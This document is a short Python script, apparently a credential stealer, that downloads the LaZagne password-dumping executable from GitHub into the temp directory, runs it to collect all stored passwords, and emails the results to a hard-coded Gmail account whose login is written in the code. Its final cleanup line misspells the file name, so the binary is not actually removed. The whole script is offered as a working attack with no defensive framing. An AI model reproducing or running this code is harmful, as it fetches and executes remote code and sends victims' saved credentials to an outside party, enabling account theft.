import requests
import subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)  # Downloading the file associated with this url
    file_name = url.split("/")[-1] # Get the file name
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content) # Write the file to disk

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir() # Get the temp directory. Cross platform
os.chdir(temp_directory) # cd to tempdir and download the file there. Cross platform
download("https://github.com/maurya-bitlegacy/LaZagne/raw/master/lazagne.exe") # Download laZagne.exe

result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("dummylegacy69@gmail.com", "dummylegacy1234", result)
os.remove("lasagne.exe") # Delete the file from temp. The file will remain in temp for a very short period of time just till the script is running
